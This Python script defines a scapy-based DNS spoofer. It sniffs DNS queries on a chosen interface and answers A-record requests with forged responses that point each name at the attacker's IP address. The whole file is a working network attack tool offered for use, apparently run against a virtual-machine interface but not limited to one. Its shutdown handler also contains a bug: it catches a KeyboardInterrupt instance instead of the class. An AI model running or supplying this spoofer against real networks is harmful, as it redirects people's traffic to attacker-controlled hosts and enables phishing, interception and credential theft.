from scapy.all import *

class DNSSpoofer:

    def __init__(self, interface: str, new_dns_ip = ''):
        self.interface = interface

        if new_dns_ip:
            self.new_dns_ip = new_dns_ip
        else:
            self.new_dns_ip = get_if_addr(interface)
    
    def isSupportedType(self, id: int) -> bool:
        supported_types = [1]

        return id in supported_types

    def recordTypeIdToName(self, id: int) -> str:
        """
        Convert type ID to name for readability
        For now, only common onces are included
        https://en.wikipedia.org/wiki/List_of_DNS_record_types
        """
        typeMap = {
            1: 'A',
            28: 'AAAA',
            5: 'CNAME',
            39: 'DNAME',
            15: 'MX',
            33: 'SRV',
            16: 'TXT'
        }

        if id in typeMap:
            return typeMap[id]
        else:
            return str(id)

    def isIncoming(self, pkt: Packet) -> bool:
        """Filter to check, whether a packet is (supposedly) incoming, and not from this interface"""
        return pkt[Ether].src != get_if_hwaddr(self.interface)

    def get_spoof_packet(self, req_pkt: Packet, name: str, recordType: str) -> Packet:
        """Generate one spoofed DNS response packet in response to a particular request"""
        res_pkt: Packet = (
            IP(src=req_pkt[IP].dst, dst=req_pkt[IP].src) /
            UDP(sport=req_pkt[IP].dport, dport=req_pkt[IP].sport)
        )

        if recordType == 1:
            # type: A
            res_pkt /= DNS(id=req_pkt[DNS].id, an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=self.new_dns_ip))

        return res_pkt

    def spoof_dns_request(self, pkt: Packet) -> None:
        """For a sniffed DNS packet, generate and send spoofed DNS responses for each requested record"""
        if pkt and DNS in pkt:
            for i in range(int(pkt[DNS].qdcount)):
                # qdcount = the number of requested records
                name = pkt[DNS].qd[i].qname
                recordType = pkt[DNS].qd[i].qtype
                print(f'Received DNS request from {pkt[IP].src} for {name} of type {self.recordTypeIdToName(recordType)}')
                if self.isSupportedType(recordType):
                    res_pkt = self.get_spoof_packet(pkt, name, recordType)
                    send(res_pkt, iface=self.interface, verbose=False)
                    print(f'Sent back response to {pkt[IP].src} with {self.recordTypeIdToName(recordType)} record: {self.new_dns_ip}')
                else:
                    print('Type not supported, ignoring...')
    
    def start(self):
        """Start an asynchronous sniffer, use the stop() method to stop this"""
        self.sniffer = AsyncSniffer(iface=self.interface, prn=self.spoof_dns_request, lfilter=self.isIncoming, store=False)
        self.sniffer.start()
        print("DNS spoofing started")

    def stop(self):
        """Stop the async sniffer"""
        if self.sniffer:
            self.sniffer.stop()
            print("DNS spoofing stopped")
        else:
            print('DNS spoofing has to be started, before it can be stopped')

if __name__ == '__main__':
    interface = 'enp10s0u1u3u3'
    interface = 'vboxnet0'

    spoofer = DNSSpoofer(interface)
    spoofer.start()

    try:
        while True:
            pass
    except KeyboardInterrupt():
        spoofer.stop()
        print("\nExit...")
